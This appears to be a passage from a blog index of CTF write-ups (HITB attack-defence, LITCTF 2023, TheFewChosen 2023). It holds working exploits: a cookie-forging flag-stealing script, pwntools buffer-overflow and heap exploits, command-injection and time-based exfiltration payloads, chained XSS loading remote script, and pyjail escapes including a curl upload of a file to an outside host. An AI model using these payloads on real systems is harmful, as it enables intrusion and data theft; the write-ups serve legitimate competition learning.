logger.error(f&quot;SUBMITTING {json.dumps(flags)}&quot;) try: data = requests.put(f&quot;{API_HOST}/flags&quot;,headers={&#39;X-Team-Token&#39;:CHECKSYSTEM_TOKEN},json=flags).json() except: time.sleep(5) submit_flags(flags) return flag_count = len(data) accepted_count = 0 for x in data: if &quot;Accepted&quot; in x[&#39;msg&#39;]: accepted_count+=1 logger.error(f&quot;Accepted flags: {accepted_count}, Denied flags: {flag_count-accepted_count}&quot;) return script,host = argvdef gen_rand(): return &#39;&#39;.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))while True: s = requests.Session() s.cookies.set(&quot;settings&quot;, &quot;isAdmin:1&quot;, domain=host) data = {&quot;username&quot;: gen_rand(),&quot;password&quot;: gen_rand()} try: r = s.post(f&quot;https://{host}/register&quot;, data=data) ids = list(set(id_regex.findall(r.text))) counter = 0 while len(ids)==0: counter+=1 if counter==100: print(f&quot;{host} is patched?&quot;) exit() time.sleep(2) r = s.get(f&quot;https://{host}/&quot;) ids = list(set(id_regex.findall(r.text))) all_flags = [] for id in ids: r = s.get(f&quot;https://{host}/edit/{id}&quot;) flags = flag_regex.findall(r.text) for flag in flags: all_flags.append(flag) for id in ids: r = s.get(f&quot;https://{host}/delete/{id}&quot;) submit_flags(all_flags) except Exception as e: print(e)By now we have narrowed down the list of hosts to the ones still vulnerable.For the final version we handle the flag submission in the script instead of the slow os.system() call we were doing earlier. We register a new account in the while loop after we’ve submitted some flags just in case our account gets deleted or cookie firewalled by the defending server. We use precompiled regexes for a minor performance improvement.We also have logging so we can watch the flags roll in!One potential speed difference as well is that we were running this on the empty server provided by the CTF organisers so we would have less network latency than teams running an exploit on a remote server over the VPN.We were late to get an exploit running on this service but by the end we had collected the most flags from this service with it so all the speed improvements had a big impact.PatchThe exploit relies on knowing the name for value in the cookie (isAdmin) so we just changed every instance of isAdmin to superSecretAdmin and that was enough to not get hacked for the rest of the competition.A better patch would be checking if req.headers[&#39;verified&#39;] == &#39;SUCCESS&#39; every time isAdmin is checked.Cool GraphsHITB were nice enough to send a JSON file with the scoreboard data so I could make some graphs of the flags being stolen on the pure service.In these graphs you can see the point at which the exploit was actually getting us flags, some point near the end the exploit must have stopped working (I didnt know this until I made the graph!). It’s also interesting that other teams were still getting some flags, this could be attributed to some patches maybe breaking my exploit that didnt affect others or maybe my method of weeding out patched instances was a bit inaccurate (ignoring ones where I dont get flags in 5mins). This could have been improved with a better check by adding our own contact and seeing if we could access it with another account. Maybe some teams changed the index we relied on and we couldn’t extract ids. Sometimes our exploit might be unlucky with timings or teams get the flag between us grabbing them and deleting them so we share the flag.ConclusionThanks to the HITB Phuket team for running this A/D CTF, it was a lot of fun and we learned a lot." }, { "title": "Lexington Informatics Tournament CTF 2023", "url": "/posts/Lexington_Informatics_Tournament_CTF_23/", "categories": "Jeopardy", "tags": "ctf, attack-defence", "date": "2023-08-08 00:00:00 +0000", "snippet": "PwnMy Pet Canary’s Birthday PieHere is my first c program! I’ve heard about lots of security features in c, whatever they do. The point is, c looks like a very secure language to me! Try breaking it.For this challenge we are given the source code along with the compiled binary. Lets first look at the source code:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int win() { system(&quot;/bin/sh&quot;);}int vuln() { char buf[32]; gets(buf); printf(buf); fflush(stdout); gets(buf);}int main() { setbuf(stdout, 0x0); setbuf(stderr, 0x0); vuln();}Okay so only 3 functions, win, vuln and main.win just runs system(&quot;/bin/sh&quot;); for us. this will be our target.vuln has two vulnerabilities, a format strings vulnerability in printf and a buffer overflow in gets.The format strings will allow us to leak useful addresses within the binary as pie is enabled. we can also use this to leak the canary token, which is another security this binary has.Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledThe idea for this exploit will be:use the format strings to leak an address in the binary, this will help us the address of win and we also want to leak the canary token. To help with this I use a simple fuzz script:#!/usr/bin/env python3from pwn import *elf = context.binary = ELF(&#39;./s&#39;, checksec=False)for i in range(100): io = process(elf.path,level=&#39;error&#39;) payload = f&quot;%{i}$p&quot; io.sendline(payload) print(f&quot;offset {i} {io.recv()}&quot;)This will print out the leak and the offset of that leak. We know the leak for the elf file will start with 0x55 or 0x56 this can vary slightly but its a good ballpark. The canary token should always end in 00.These are some leaks we get:offset 1 b&#39;0x1&#39;offset 2 b&#39;0x1&#39;offset 3 b&#39;0x7f6cfa619aa0&#39;offset 4 b&#39;(nil)&#39;offset 5 b&#39;(nil)&#39;offset 6 b&#39;0x7f0070243625&#39;offset 7 b&#39;0x7fed790815ff&#39;offset 8 b&#39;(nil)&#39;offset 9 b&#39;(nil)&#39;offset 10 b&#39;0x7ffecfe285c0&#39;offset 11 b&#39;0xe9f733d70ed31600&#39;offset 12 b&#39;0x7ffcbea30270&#39;offset 13 b&#39;0x560354ce82ae&#39;offset 14 b&#39;0x1&#39;offset 15 b&#39;0x7f088c429d90&#39;11 looks like the canary token, and 13 looks like a stack address. we can confirm this by using gbd the steps for that are:run the program with gdb ./s enter %11$p %13%p to get the leaks and use ctrl+c to break the program. x/s 0x5.... for the elf leak and just type canary for the canary token. we can see the canary token matches up and the other leak shows &amp;lt;main+58&amp;gt; so we are leaking main+58. we can run the program a few time to match sure this is always the same. Once we know that we can workout the offset at which main+58 is. and we minus that from our leak and it will give us the base address of the program.Building the exploitThe last part we need is the offset. Due to the canary just throwing a cyclic pattern will know fill rbp with data so we can work it out manually.The buffer is 32 and we will need to padding to reach rbp so it should be 32+8setting out offset as 40 we just need to build the exploit.our first payload will just be the two format string offsets. after we get those leaks we need to get the base address of the program. (we could also just work out the offset from our leak to win)and the 2nd payload will bepadding * 40 + canary token + junk data to reach rbp + ret + winwe need to ret address otherwise our stack alignment will be off.we get this with ropper --file s --search &quot;ret&quot;our final exploit script looks like this:#!/usr/bin/env python3from pwn import *exe = &#39;./s&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())#### Exploit starts here ####io = start()#canary token is 11offset = 40io.sendline(b&#39;%11$p %13$p&#39;)leaks = io.recv().decode()leaks = leaks.split()canary = leaks[0]binleak = leaks[1]binleak = int(binleak,16)base = binleak - 0x12aecanary = int(canary,16)win = base + 0x11e9ret = base + 0x101amain = base + 0x1274log.info(f&quot;canary token {hex(canary)}&quot;)payload = b&#39;A&#39; * offsetpayload += p64(canary)payload += b&#39;\\x00&#39; * 8payload += p64(ret)payload += p64(win)io.sendline(payload)io.interactive()flag: LITCTF{rule_1_of_pwn:_use_checksec_I_think_06d2ee2b}File Reader?This program reads a file called flag.txt, but it doesn’t seem to work…We are given the source code, the binary and the glibc files.Lets look at the source code:#include &amp;lt;fcntl.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int main() { char *c = malloc(64); char *d = malloc(64); printf(&quot;%p\\n&quot;, d); unsigned long a = 0; unsigned long b = 0; free(c); scanf(&quot;%lu&quot;, &amp;amp;a); scanf(&quot;%lu&quot;, &amp;amp;b); *((unsigned long *)a) = b; puts(&quot;Exiting...&quot;); free(c); int fd = open(&quot;flag.txt&quot;, O_RDONLY); d[read(fd, d, 64)-1] = 0; puts(d); free(d); return 0;}We can see the use of malloc and free so this will be a heap related exploit.running the program leaks an address.printf(&quot;%p\\n&quot;, d);This is leaking the address of d, which means we have a heap address beaning leaked. c is than free’d.The next 3 lines of code is what we are exploiting:scanf(&quot;%lu&quot;, &amp;amp;a);scanf(&quot;%lu&quot;, &amp;amp;b);*((unsigned long *)a) = b;The scanf will let us write to a and b. and *((unsigned long *)a) = b; is than writing the content of b to a.next the program frees c again, but this is a double free which makes the program crash. it crashes just before the flag is printed as well which is a shame :(we can see that in action by just writing any data to the leaked address.(we first convert the hex address to int)❯ ./s0x55e85c2762f094456466858736123Exiting...free(): double free detected in tcache 2So the idea for this will be to stop the double free.We know the malloc chunk is 64 bytes so we if take say, 65 away from the leaked address, and write junk data to that location. we can overwrite the key value of that chunk, this way the program does not know if this chunk has been free’d and the program will not crash, and it will reach the part that prints the flag.the exploit script:#!/usr/bin/env python3from pwn import *exe = &#39;./s&#39;elf = context.binary = ELF(exe)context.terminal = [&#39;alacritty&#39;, &#39;-e&#39;, &#39;zsh&#39;, &#39;-c&#39;]#context.log_level= &#39;DEBUG&#39;def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # (&#39;server&#39;, &#39;port&#39;) return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)gdbscript = &#39;&#39;&#39;&#39;&#39;&#39;.format(**locals())#### Exploit starts here ####io = start()heapaddr = io.recvline().strip()heapaddr = int(heapaddr, 16)io.sendline(str(heapaddr - 65).encode())io.sendline(str(heapaddr).encode())log.success(io.recvlines(2)[1].decode())This pdf gives a better outline of what is happening in this exploit: https://drive.google.com/file/d/1g2qIENh2JBWmYgmfTJMJUier8w0XAGDt/viewflag: LITCTF{very_legitimate_exit_function}MiscSo You Think You Can TalkA lot of people think they can….. Well let’s find out in our Discord Server #so-you-think-you-can-talk channel. Beat your competitors by talking most! Send +explain in the channel to get a more detailed explanation of the challenge.This is a misc discord challenge.going to that channel we can get more info:The bots code:client.on(&quot;messageCreate&quot;, async (msg) =&amp;gt; { if(msg.content.length &amp;gt; 2000) return; if(msg.channelId == 1137653157825089536) { // Within the right channel user_id = msg.author.id; if(!users.has(user_id)) { users.set(user_id,new User(msg.author.globalName)); } if(users.get(user_id).disabled) return; if(msg.mentions.repliedUser) { const repliedTo = await msg.channel.messages.fetch(msg.reference.messageId); if(repliedTo.content.length &amp;gt; 2000) return; if(repliedTo.author.id == msg.author.id) return; if(msg.createdTimestamp - repliedTo.createdTimestamp &amp;lt;= 2 * 60000) { // 2 minutes of time if(await check(msg.content,repliedTo.content)) { // Yay successfully earn point users.get(user_id).score += 1; users.get(repliedTo.author.id).score = Math.max(users.get(repliedTo.author.id).point - 0.4,0); msg.react(&#39;😄&#39;); }else{ // Nope, you get points off users.get(user_id).score = Math.max(users.get(user_id).score - 0.4,0); msg.react(&#39;😭&#39;); } } }else{ // [redacted] } }});and +explain tells us:The objective of this game is to talk as much as possible. However, your messages can&#39;t just be SPAM, as they will be verified by chatGPT. In order to earn a point, the following criteria must be met: You must send the message in this channel You must be replying to a message sent by another author The message you reply to must be recent and no more than 2 minutes old Your comment must be respectful, substanceful, and insightful. ChatGPT gets to decide if you pass this or not. Finally, after some set period of time (like 15 minutes), whoever is the highest on the leaderboard will get the flag IF they also have at least 20 points.If you pass all criterion, you get 1 point. If you pass all but the last criterion, you get deducted 0.4 point. In addition, if somebody replies to you and passes, you get deducted 0.4 points.Finally, for more details, try the +code command to see the relevant source code.Okay, we we need to respond to others in the channel, our messages will be checked by chatgpt to see if they are “respectful, substanceful, and insightful” and if chatgpt likes the message we get a smiley face, otherwise we get a crying face. Only messages that are responding to other uses will work for this.I went to chatgpt and gave it this prompt:Userlet play a game. I will ask you some random things and they you must be respectful, substanceful, and insightful to me when i ask. do you understand?and gotOf course, I understand. I&#39;m here to provide respectful, substanceful, and insightful responses to your questions. Feel free to ask anything, and I&#39;ll do my best to assist you! Let&#39;s start the game.What happened next is a long story.in steps Jim.I dont know Jim but for around 30-40 minutes Jim would ask random questions which I just threw into chatgptStarted with:I&#39;ve been thinking about buying a flat keyboard, but I also want coffee. How can I get both?My first happy face. I need 20 of these to get the flag.The tale look a turn and went from a question of keyboards to Jefferey, who went from getting bullied, to being a bully to stacking what we can assume is Jim. all this time chatgpt was giving “respectful, substanceful, and insightful” replies to the life of Jefferey and Jim. This entire story will soon be a movie, We are just waiting on Netflix to get back to us.After close to 40 minutes I got the flag. Only the person in first gets the flag so I was beaten to the spot once, and didnt have 20 points the first time it came around.flag: LITCTF{Huh_1_gu3s5_u_R34lly_c4n_t4lk_4ft3ral1}geoguessrWhere am I? The flag is LITCTF{latitude,longtitude} rounded to the third decimal place. (Example: LITCTF{42.444,-71.230})All I had to go off for this challenge was this image: Going off the challenge name and description, I figured that I needed to find the location that the image was taken. Checking the metadata of the image yielded no results, so to google maps we go!First, I had a good look at the image. I noticed that the cars were driving on the right hand side of the road, and there was a speed limit sign that said 55. I immediately thought of America. Further searching of the image, I saw the blue signs on the right of the image, which confirmed to me that it was the USA.Zooming in on the image, I could just about make out that the top sign said 87, and the bottom sign was 28- (I wasn’t sure whether the last number was a 1 or a 7).I went down a rabbit hole for a little while, looking at different route 87’s in the USA, and eventually found out that the blue signs meant it was an interstate.I put I-87 into google maps (other online maps are available :D) where it put me in New York, and made my way up the map until I noticed that it merged into the I-287 for a stretch. At this point, I went into street view and had the picture up as reference. Looking at the background of the picture, I could faintly make out water lines, so I went over the Mario Cuomo bridge and went to the bend on the left (near South Nyack) until I matched what I saw on Google Maps with the original image.Using the description as a hint for the flag format, I rounded the last numbers to get the flag.flag: LITCTF{41.077,-73.921}ReviloveregexFor this challenge we are just given the flag regex:^LITCTF\\{(?&amp;lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\\1)(?=.{4}(.).{18}\\2)(?=.{6}(.).{2}\\3)(?=.{3}(.).{11}\\4)(?=.{3}(.).{3}\\5)(?=.{16}(.).{4}\\6)(?=.{27}(.).{4}\\7)(?=.{12}(.).{4}\\8)(?=.{3}(.).{8}\\9)(?=.{18}(.).{2}\\10)(?=.{4}(.).{20}\\11)(?=.{11}(.).{2}\\12)(?=.{32}(.).{0}\\13)(?=.{3}(.).{24}\\14)(?=.{12}(.).{9}\\15)(?=.{7}(.).{2}\\16)(?=.{0}(.).{12}\\17)(?=.{13}(.).{5}\\18)(?=.{1}(.).{0}\\19)(?=.{27}(.).{3}\\20)(?=.{8}(.).{17}\\21)(?=.{16}(.).{6}\\22)(?=.{6}(.).{6}\\23)(?=.{0}(.).{1}\\24)(?=.{8}(.).{11}\\25)(?=.{5}(.).{16}\\26)(?=.{29}(.).{1}\\27)(?=.{4}(.).{9}\\28)(?=.{5}(.).{24}\\29)(?=.{15}(.).{10}\\30).*}$To approach this I broke it down into parts and manually made matching strings on RegExr.First is the start and end which are literals - LITCTF{}.Next I need to match this regex: ^LITCTF\\{(?&amp;lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5}).*}$(?&amp;lt;=...) is a positive lookbehind, I’m not going to pretend to understand how that works but the whole string must match it in this case.(?=...) is a positive lookahead which needs to match everything after the current point in the string (because we’re in the lookbehind this means from the start) but it’s a lookahead meaning the next token in the regex starts at the same point.So (?=.{42}(?!.)) means there is 42 characters after this point and no more..(?=.{24}greg) means 25 characters into the string the next characters are greg.(?=.{30}gex) means 32 characters (incl. the dot from previous part) into the string the next characters are gex.Putting that all together we get our first matching string:LITCTF{__________________greg___gex______}All the next regex components use lookaheads with backreferences.Backreferences match previously matched parts of the string. So for example \\1 will match the first group that was matched.Let’s try: ^LITCTF\\{(?&amp;lt;=(?=.{42}(?!.)).(?=.{24}greg).(?=.{30}gex).{5})(?=.{4}(.).{19}\\1).*}Weird, our existing string already matches? Yes since most of the characters are underscores the backreferences will match anyway.We can’t continue like this however as we will need to figure out what backrfeferences matches what later.(?=.{4}(.).{19}\\1) means the 20th character matches the 5th character, so let’s replace those with 1 for now:LITCTF{____1_____________greg__1gex______}The rest is left as an exercise for the reader.Flag: LITCTF{rrregereeregergegegregegggexexexxx}WebPing pongThe code for this challenge is:from flask import Flask, render_template, redirect, requestimport osapp = Flask(__name__)@app.route(&#39;/&#39;, methods = [&#39;GET&#39;,&#39;POST&#39;])def index(): output = None if request.method == &#39;POST&#39;: hostname = request.form[&#39;hostname&#39;] cmd = &quot;ping -c 3 &quot; + hostname output = os.popen(cmd).read() return render_template(&#39;index.html&#39;, output=output)The solution is fairly straight forward, we have command execution as our input is added to a command without any sanitization.Payload:fbi.gov;cat flag.txtFlag: LITCTF{I_sh0uld_b3_m0r3_c4r3ful}Ping Pong: Under MaintenanceThe next iteration of this is a bit more challengingfrom flask import Flask, render_template, redirect, requestimport osapp = Flask(__name__)@app.route(&#39;/&#39;, methods = [&#39;GET&#39;,&#39;POST&#39;])def index(): output = None if request.method == &#39;POST&#39;: hostname = request.form[&#39;hostname&#39;] cmd = &quot;ping -c 3 &quot; + hostname output = os.popen(cmd).read() return render_template(&#39;index.html&#39;, output=&#39;The service is currently under maintainence and we have disabled outbound connections as a result.&#39;)This time we don’t get any output and the server doesn’t allow outbound connections (we tested with interactsh and curl, wget and ping to be sure!).However we do have a way to extract information.;sleep 3 will delay the response by 3 seconds. So if we bruteforce the flag character by character and make it sleep when it matches we will have the flag.Here’s the script I made for this:import requestsimport stringtarget = &#39;http://34.130.180.82:55943/&#39;pos = 0flag = &#39;&#39;while True: for x in string.printable: payload = &#39;;bash -c \\&#39;flag=`cat flag.txt`;if [ ${flag:&#39; + str(pos) + &#39;:1} == &quot;&#39;+x+&#39;&quot; ]; then sleep 10; fi\\&#39;&#39; r = requests.post(target,data={&#39;hostname&#39;:payload}) if r.elapsed.total_seconds() &amp;gt; 10: print(f&quot;Char: {x}&quot;) flag+=x if x==&#39;}&#39;: exit(flag) break print(f&quot;{pos} - {x} - {r.elapsed.total_seconds()}&quot;) pos+=1Thankfully the flag wasn’t too long: LITCTF{c4refu1_fr}Art-ContestThis challenge had a lot of steps and in the end was only solved by 7 teams.The GoalWhen doing web challenges, I’ll usually work backwards by first figuring out where the flag is stored and then seeing what functionality can be used to reach that target. In this case, if the /judge endpoint is called with a valid ID and the bot subsequently opens the status page for the ID and it contains “winner!!” in its text, it will replace the content of the status file with the flag. We can then visit the status page and retrieve the flag. It seems as though we will need to confuse the judge bot into thinking our page contains the aforementioned text.XSS via file upload bypassIt is possible to upload any file which has either an extension of “txt” or no extension at all. To check the extension, the following code is used:ext = os.path.splitext(abs_path)[1]This is not a secure means of validating a file extension and we can get XSS by uploading a file with a name such as ...html to the /upload endpoint.We tried a number of directory traversal tricks here but didn’t find anything of use aside from the XSS.This XSS is useful because the judge bot will visit this file before checking the page status. We can use this to manipulate the bot so that its next request to check the status will contain winner!!. But how?Polluting context.pagesWe can see the following code defines status_page:status_page = context.pages[1]In order to get the flag, we must see winner!! in the status_page.content() method call. We noticed that using the previous XSS to call window.open() does just that. It will add an additional page to the context.pages list and it happens to be located at context.pages[1]in the list!A little known fact is that you can actually modify the content of a window.open() using code such as:var my = window.open(&#39;/x&#39; + e, &#39;_blank&#39; ,&quot;height=600, width=600&quot;);my.onload = function () { my.document.body.innerHTML = &quot;winner!!&quot;;};This would be pass the check for content containing winner!! but we must also allow for the status_page.url == &quot;http://localhost:5000/status/&quot; + id check.Herein lies a small issue; we don’t know the value for the id variable!This isn’t actually such a big problem, we can just upload a separate file and save its ID. Then we have a valid ID to reference. I decided to host this on my server and use a fetch() to pull its value so I could easily change the ID if I needed:fetch(&quot;http://ireland.re/callback&quot;).then(r =&amp;gt; {console.log(r.text().then(e =&amp;gt; {var my = window.open(&#39;http://127.0.0.1:5000/status/&#39; + e, &#39;_blank&#39; ,&quot;height=600, width=600&quot;);my.onload = function () { my.document.body.innerHTML = &quot;winner!!&quot;;};But we encounter another problem here. You can only edit the content of a window if it’s within the same origin in which the javascript is executing. Our payload is running on the file:// URI, which does not have authority over a localhost page.XSS via filenameThen I noticed that there is actually a second XSS, in the filename of the upload. We can pass the above script in here (where it will be able to modify the window.open).But it won’t ever visit this page, right?Yes, it won’t. But we can now just redirect from the file:// page to this.Final ApproachWe upload a file with the name &amp;lt;script src=&#39;http://ireland.re/js&#39;&amp;gt;&amp;lt;/script&amp;gt; which has the following contents:fetch(&quot;http://ireland.re/callback&quot;).then(r =&amp;gt; {console.log(r.text().then(e =&amp;gt; {var my = window.open(&#39;http://127.0.0.1:5000/status/&#39; + e, &#39;_blank&#39; ,&quot;height=600, width=600&quot;);my.onload = function () { my.document.body.innerHTML = &quot;winner!!&quot;;};We save the ID of the uploaded file.Then, we upload a file with the following contents:We first upload a file names ...html with the following contents:&amp;lt;script&amp;gt;window.location.href = &quot;http://127.0.0.1:5000/status/&amp;lt;id&amp;gt;&quot;;&amp;lt;/script&amp;gt;We can substitute the ID in above, for &amp;lt;id&amp;gt; and it will redirect to the page containing our payload.We will need to first submit the original file for judging, so its status page is populated with our XSS payload. Then, we can submit the previously uploaded file for judging.It will visit our file:// XSS which will redirect it to our status page containing another XSS, use window.open() to pollute the page context and modify it to contain winner!! with the correct origin. Then, we simply visit the status page to retrieve the flag!CreditsThanks to all members of Ireland Without the RE who helped with this. It was a fun challenge!-m0z" }, { "title": "TheFewChosen 2023", "url": "/posts/TheFewChosen_2023/", "categories": "Jeopardy", "tags": "ctf, crypto, web, pwn, reversing, forensics", "date": "2023-07-30 00:00:00 +0000", "snippet": "CryptoDizzyWe’re given this to decipher:T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24The solution is to rearrange the characters in order and the order is determined by the number attached after it.f = &quot;T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24&quot;.split()f[&#39;T4&#39;, &#39;l16&#39;, &#39;_36&#39;, &#39;510&#39;, &#39;_27&#39;, &#39;s26&#39;, &#39;_11&#39;, &#39;320&#39;, &#39;414&#39;, &#39;{6&#39;, &#39;}39&#39;, &#39;C2&#39;, &#39;T0&#39;, &#39;m28&#39;, &#39;317&#39;, &#39;y35&#39;, &#39;d31&#39;, &#39;F1&#39;, &#39;m22&#39;, &#39;g19&#39;, &#39;d38&#39;, &#39;z34&#39;, &#39;423&#39;, &#39;l15&#39;, &#39;329&#39;, &#39;c12&#39;, &#39;;37&#39;, &#39;19&#39;, &#39;h13&#39;, &#39;_30&#39;, &#39;F5&#39;, &#39;t7&#39;, &#39;C3&#39;, &#39;325&#39;, &#39;z33&#39;, &#39;_21&#39;, &#39;h8&#39;, &#39;n18&#39;, &#39;132&#39;, &#39;k24&#39;]d = {}for x in f: d[x[1:]] = x[0]flag = &quot;&quot;for i in range(len(d.keys())): flag += d[str(i)]print(flag)Running the script gives the flag:TFCCTF{th15_ch4ll3ng3_m4k3s_m3_d1zzy_;d}MayDay!We’re given this to decipher:Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform SevenPutting this into cryptii yields:wh4tDashAlphar3DashyouDashs1nkingDash4b0u7The flag is:TFCTF{WH4T-AR3-YOU-S1NKING-4B0U7}ForensicsSome TrafficWe’re given a pcapng file to analyse. From reading the requests we can see a few HTTP POST requests containing image files.We can convert the pcapng to a pcap file by opening it in Wireshark and saving it. Now we can use Network Miner to extract the image files that are being uploaded in it.The flag can be extracted by running zsteg on the third image (output_modified.png) or by uploading it to AperiSolve. In this case however AperiSolve was inconsistent in showing the full ztego output with the flag.Flag:TFCCTF{H1dd3n_d4t4_1n_p1x3ls_i5n&#39;t_f4n_4nd_e4sy_to_f1nd!}MiscDiscord Shenanigans V3The discord bot has an avatar with the flag in it, you can get it by using inspect element and downloading the discord avatar.My First CalculatorThis challenge is a pyjail where we can’t use letters or full stop.import sysprint(&quot;This is a calculator&quot;)inp = input(&quot;Formula: &quot;)sys.stdin.close()blacklist = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.&quot;if any(x in inp for x in blacklist): print(&quot;Nice try&quot;) exit()fns = { &quot;pow&quot;: pow}print(eval(inp, fns, fns))This restriction can be bypassed by using italic characters that get normalised by python.You can use lingojam’s italic text generator to do this. We used exec with the rest encoded in octal to get the flag.Before transformation:exec(&#39;print(open(&quot;flag&quot;).read())&#39;)After:𝘦𝘹𝘦𝘤(&#39;\\160\\162\\151\\156\\164\\050\\157\\160\\145\\156\\050\\042\\146\\154\\141\\147\\042\\051\\056\\162\\145\\141\\144\\050\\051\\051&#39;)Putting this in gives us the flag:TFCCTF{18641f40c9beac02ceeaf87db851c386}My Third CalculatorThis is the next pyjail challenge (there was no second calculator).import sysprint(&quot;This is a safe calculator&quot;)inp = input(&quot;Formula: &quot;)sys.stdin.close()blacklist = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.&quot;if any(x in inp for x in blacklist): print(&quot;Nice try&quot;) exit()fns = { &quot;__builtins__&quot;: {&quot;setattr&quot;: setattr, &quot;__import__&quot;: __import__, &quot;chr&quot;: chr}}print(eval(inp, fns, fns))This time builtins are overwritten except for setattr, __import__ and chr.We can change strings into a bunch of chr() calls using this smol script:def text_to_character_code(text): return &quot;+&quot;.join([f&quot;char({ord(x)})&quot; for x in text])print(text_to_character_code(input(&#39;input&amp;gt;&#39;)))After looking through old pyjail solutions we ended up using the antigravity payload:__import__(&#39;antigravity&#39;,setattr(__import__(&#39;os&#39;),&#39;environ&#39;,{&#39;BROWSER&#39;:&#39;/bin/sh -c &quot;curl -T flag cj2hjb3b7pnbr8g80gf0ifgcciwaz587a.oast.fun;exit&quot; #%s&#39;})) The antigravity module is a joke module that is a reference to XKCD #353 and importing it opens that XKCD comic in the browser. We can overwrite the browser env variable with our shell command and that gets executed instead of the browser when it gets imported.We transform this payload by changing all the strings into chr() calls and italicising like before:__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(97)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(121),𝘴𝘦𝘵𝘢𝘵𝘵𝘳(__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(111)+𝘤𝘩𝘳(115)),𝘤𝘩𝘳(101)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(118)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(110),{𝘤𝘩𝘳(66)+𝘤𝘩𝘳(82)+𝘤𝘩𝘳(79)+𝘤𝘩𝘳(87)+𝘤𝘩𝘳(83)+𝘤𝘩𝘳(69)+𝘤𝘩𝘳(82):𝘤𝘩𝘳(47)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(47)+𝘤𝘩𝘳(115)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(117)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(45)+𝘤𝘩𝘳(84)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(108)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(106)+𝘤𝘩𝘳(50)+𝘤𝘩𝘳(104)+𝘤𝘩𝘳(106)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(51)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(55)+𝘤𝘩𝘳(112)+𝘤𝘩𝘳(110)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(114)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(48)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(48)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(102)+𝘤𝘩𝘳(103)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(119)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(122)+𝘤𝘩𝘳(53)+𝘤𝘩𝘳(56)+𝘤𝘩𝘳(55)+𝘤𝘩𝘳(97)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(98)+𝘤𝘩𝘳(112)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(46)+𝘤𝘩𝘳(99)+𝘤𝘩𝘳(111)+𝘤𝘩𝘳(109)+𝘤𝘩𝘳(59)+𝘤𝘩𝘳(101)+𝘤𝘩𝘳(120)+𝘤𝘩𝘳(105)+𝘤𝘩𝘳(116)+𝘤𝘩𝘳(34)+𝘤𝘩𝘳(32)+𝘤𝘩𝘳(35)+𝘤𝘩𝘳(37)+𝘤𝘩𝘳(115)}))Submitting this gave us the flag:TFCCTF{60c7502daf7f94106a295d7dea14b63df2048f8d}WebBaby Ducky NotesWe’re given the source code for this notes app. First we checked for where the flag is 